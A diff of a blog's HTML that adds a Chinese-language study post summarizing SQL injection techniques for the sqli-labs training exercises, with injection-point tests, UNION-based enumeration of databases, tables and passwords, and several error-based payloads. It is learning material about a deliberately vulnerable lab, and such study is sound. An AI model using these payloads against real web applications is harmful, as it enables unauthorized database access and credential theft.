@@ -283,6 +283,243 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/04/sqli-labs-Summarize-Less-1-22-Basic-Injections/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ahodor">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ahodor'Via">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/07/04/sqli-labs-Summarize-Less-1-22-Basic-Injections/" itemprop="url">sqli-labs-Summarize-Less-1-22_Basic-Injections</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-04T11:09:55+08:00">
+                2018-07-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="sqli-labs-Summarize-Less-1-22-Basic-Injections"><a href="#sqli-labs-Summarize-Less-1-22-Basic-Injections" class="headerlink" title="sqli-labs-Summarize-Less-1-22(Basic-Injections)"></a>sqli-labs-Summarize-Less-1-22(Basic-Injections)</h1><h2 id="重要的系统数据库"><a href="#重要的系统数据库" class="headerlink" title="重要的系统数据库"></a>重要的系统数据库</h2><pre><code>mysql.user 存储MySQL数据库的用户及用户权限信息
+and (select count(*) from mysql.user)&gt; 判断是否具有读写权限
+
+information_schema.user_privileges存储mysql中所有数据库的权限信息
+
+information_schema.schemate 存储mysql中所有的数据库
+遍历查询系统中所有数据库名
+select schema_name from information_schema.schemata limit 0,1
+
+information_schema.tables 存储mysql中所有数据库的表
+遍历查询数据库中所有的表名
+select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1
+
+information_schema.columns存储mysql中所有数据库的列
+遍历查询表中所有的列名
+select column_name form information_schema.columns where table_name=&apos;users&apos; limit 0,1
+
+遍历查询表中的数据
+select password from security.users limit 0,1
+</code></pre><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><p><strong>select</strong> 用于输出信息</p>
+<pre><code>select 列名|（数字|字符串|函数）as 别名（as可以省略）[from ...]
+</code></pre><p><strong>union</strong> 联合操作符，要求前后列数相同，数据类型相差不大</p>
+<p><strong>group by</strong> 分组</p>
+<p><strong>order by</strong> 排序，常用于猜解字段数</p>
+<pre><code>order by 列名|序列号 
+</code></pre><p><strong>sql的switch</strong>语句</p>
+<pre><code>case expr when a then a** when b then b* else c* end 
+</code></pre><p><strong>if 函数</strong>，当expr1为真返回expr2否则返回expr3</p>
+<pre><code>if(expr1,expr2,expr3) 
+</code></pre><h3 id="常用函数（获取系统信息）"><a href="#常用函数（获取系统信息）" class="headerlink" title="常用函数（获取系统信息）"></a>常用函数（获取系统信息）</h3><pre><code>system_user()        /*系统用户名
+user()               /*用户名
+current_user()       /*当前用户名
+session_user()       /*连接数据库的用户名
+database()           /*数据库名
+version()            /*MYSQL数据库版本
+load_file()          /*MYSQL读取本地文件的函数
+@@datadir            /*读取数据库路径
+@@basedir MYSQL      /*安装路径
+@@version_compile_os /*操作系统
+</code></pre><h3 id="常用字符串函数"><a href="#常用字符串函数" class="headerlink" title="常用字符串函数"></a>常用字符串函数</h3><pre><code>concat()                          /*连接字符串
+group_concat()
+concat_ws()                       /*连接字符串，第一个参数为分隔符
+char()                            /*获得字符串
+left(str, len)                    /*截取str左边len位  
+right(str, len)                   /*截取str右边len位
+substring(str, pos, len)          /*截取字符串
+rand()                            /*生成0至1的随机数
+floor(n)                          /*向下取整 
+name_conset(column_name, value)   /*用来产生一个结果集合
+
+sleep(seconds) 停止seconds秒，用于time-based盲注
+benchmark(times, function) 将function执行times次，该函数可用于time-based盲注，例如（benchmark(500000, encode(‘a’,’b&apos;))）
+encode(str, passwd_str) 使用passwd_str加密str函数
+</code></pre><h2 id="判断是否可以注入"><a href="#判断是否可以注入" class="headerlink" title="判断是否可以注入"></a>判断是否可以注入</h2><h3 id="使用标点符号-单引号，双引号，括号-判断注入，例如："><a href="#使用标点符号-单引号，双引号，括号-判断注入，例如：" class="headerlink" title="使用标点符号(单引号，双引号，括号)判断注入，例如："></a>使用标点符号(单引号，双引号，括号)判断注入，例如：</h3><pre><code>http://aaa.com/s.php?id=1&apos;
+如果返回页面提示syntax error，则说明有漏洞
+</code></pre><h3 id="通过附加逻辑运算判断注入，例如："><a href="#通过附加逻辑运算判断注入，例如：" class="headerlink" title="通过附加逻辑运算判断注入，例如："></a>通过附加逻辑运算判断注入，例如：</h3><pre><code>http://aaa.com/s.php?id=1 and 1=1/and 1=2
+and 1=1有返回，and 1=2无返回
+</code></pre><h3 id="通过算数运算判断注入点，例如："><a href="#通过算数运算判断注入点，例如：" class="headerlink" title="通过算数运算判断注入点，例如："></a>通过算数运算判断注入点，例如：</h3><pre><code>http://aaa.com/s.php?id=11-1
+</code></pre><h3 id="通过select语句判断注入点，例如："><a href="#通过select语句判断注入点，例如：" class="headerlink" title="通过select语句判断注入点，例如："></a>通过select语句判断注入点，例如：</h3><pre><code>http://aaa.com/s.php?id=(select 10)
+</code></pre><h3 id="通过时间函数判断注入点，例如："><a href="#通过时间函数判断注入点，例如：" class="headerlink" title="通过时间函数判断注入点，例如："></a>通过时间函数判断注入点，例如：</h3><pre><code>http://aaa.com/s.php?id=2 and sleep(10)
+或者http://aaa.com/s.php?id=2 and benchmark(500000, encode(&apos;msg&apos;,&apos;bbb&apos;))
+</code></pre><h2 id="常规注入流程"><a href="#常规注入流程" class="headerlink" title="常规注入流程"></a>常规注入流程</h2><h3 id="猜解列数"><a href="#猜解列数" class="headerlink" title="猜解列数"></a>猜解列数</h3><pre><code>order by n /*（注释符 /*  # --）
+</code></pre><h3 id="查询mysql基本信息-假设数据库表有7列"><a href="#查询mysql基本信息-假设数据库表有7列" class="headerlink" title="查询mysql基本信息(假设数据库表有7列)"></a>查询mysql基本信息(假设数据库表有7列)</h3><pre><code>and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7/* 
+例如：select * from sedb.site_tb where 1=2 union select 1,2,concat_ws(char(32,58,32),0x7c,user(),database(),version());
+</code></pre><h3 id="查询mysql数据库中有哪些数据库-注意使用limit限制查询的范围"><a href="#查询mysql数据库中有哪些数据库-注意使用limit限制查询的范围" class="headerlink" title="查询mysql数据库中有哪些数据库(注意使用limit限制查询的范围)"></a>查询mysql数据库中有哪些数据库(注意使用limit限制查询的范围)</h3><pre><code>and 1=2 union select 1,schema_name,3,4 from information_schema.schemata/*
+
+and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata/*
+
+例如：select * from site_tb where 1=2 union select 1, 2, group_concat(schema_name) from information_schema.schemata;
+</code></pre><h3 id="查询某个数据库中有哪些表（数据库名可能需要16进制）"><a href="#查询某个数据库中有哪些表（数据库名可能需要16进制）" class="headerlink" title="查询某个数据库中有哪些表（数据库名可能需要16进制）"></a>查询某个数据库中有哪些表（数据库名可能需要16进制）</h3><pre><code>and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库名
+
+and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库名
+
+例如：select * from site_tb where 1=2 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&apos;sedb&apos;;
+</code></pre><h3 id="查询某个表中有哪些字段（表名、数据库名可能需要16进制）"><a href="#查询某个表中有哪些字段（表名、数据库名可能需要16进制）" class="headerlink" title="查询某个表中有哪些字段（表名、数据库名可能需要16进制）"></a>查询某个表中有哪些字段（表名、数据库名可能需要16进制）</h3><pre><code>and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名 and table_schema=数据库名 limit 1,1/*
+
+and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名 and table_schema=数据库名/*
+
+例如：select * from site_tb where 1=2 union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&apos;site_tb&apos; and table_schema=&apos;sedb&apos;;
+</code></pre><h3 id="查询数据："><a href="#查询数据：" class="headerlink" title="查询数据："></a>查询数据：</h3><pre><code>and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表/*
+</code></pre><h2 id="MySql报错注入"><a href="#MySql报错注入" class="headerlink" title="MySql报错注入"></a>MySql报错注入</h2><p>假设查询语句为：</p>
+<pre><code>select name,password from test.user where id={参数}
+</code></pre><p>{参数}：按照mysql语法，where后可以跟and、union，因此可以1 and (select <em>)以及1 union select </em>来触发报错注入</p>
+<p>因此插入报错语句位置如下：</p>
+<pre><code>select colum1,colum2 from table where id={0} and {1} union {2}
+</code></pre><h3 id="使用floor-left-right："><a href="#使用floor-left-right：" class="headerlink" title="使用floor/left/right："></a>使用floor/left/right：</h3><pre><code>select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a;
+
+select 1 from (select concat(user(),left(rand(),3)),count(*) from information_schema.tables group by 1)a;
+
+select 1 from (select concat(user(),right(rand(),3)),count(*) from information_schema.tables group by 1)a;
+</code></pre><p>例如：</p>
+<pre><code>select name,password from user where id=1 union select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a
+ERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;
+</code></pre><h3 id="使用name-const："><a href="#使用name-const：" class="headerlink" title="使用name_const："></a>使用name_const：</h3><pre><code>select 1 from (select name_const(version(),1),name_const(version(),1))x
+</code></pre><p>例如：</p>
+<pre><code>select name,password from test.user where id=1 union select 1 from (select name_const(version(),1), name_const(version(), 1))x;
+</code></pre><h3 id="使用updatexml："><a href="#使用updatexml：" class="headerlink" title="使用updatexml："></a>使用updatexml：</h3><pre><code>updatexml(1,concat(0x3a,user()),1)
+</code></pre><p>例如：</p>
+<pre><code>select name,password from test.user where id=2 and updatexml(1,concat(0x3a,user()),1);
+</code></pre><h3 id="使用extractvalue："><a href="#使用extractvalue：" class="headerlink" title="使用extractvalue："></a>使用extractvalue：</h3><pre><code>extractvalue(1, concat(0x5c,version()))
+</code></pre><p>例如：</p>
+<pre><code>select name,password from test.user where id=2 and extractvalue(1, concat(0x5c, version()));
+</code></pre><h3 id="使用exp："><a href="#使用exp：" class="headerlink" title="使用exp："></a>使用exp：</h3><pre><code>exp(~(select*from(select user())x))
+</code></pre><p>例如：</p>
+<pre><code>select name,password from test.user where id=exp(~(select*from(select user())x));
+</code></pre><h3 id="使用GeometryCollection："><a href="#使用GeometryCollection：" class="headerlink" title="使用GeometryCollection："></a>使用GeometryCollection：</h3><pre><code>GeometryCollection((select * from (select * from(select user())a)b))
+
+polygon((select * from (select * from(select user())a)b))
+
+multipoint((select * from (select * from(select user())a)b))
+
+multilinestring((select * from (select * from(select user())a)b))
+
+multipolygon((select * from (select * from(select user())a)b))
+
+linestring((select * from (select * from(select user())a)b))
+</code></pre><p>例如：</p>
+<pre><code>select name,password from test.user where id=2 and GeometryCollection((select * from (select * from(select user())a)b));
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/26/sqli-labs-Less-17-22/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2730,7 +2967,7 @@ sqli-labs/Less-4/?id=-1&quot;) union select 1,2,3,4,5%23
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
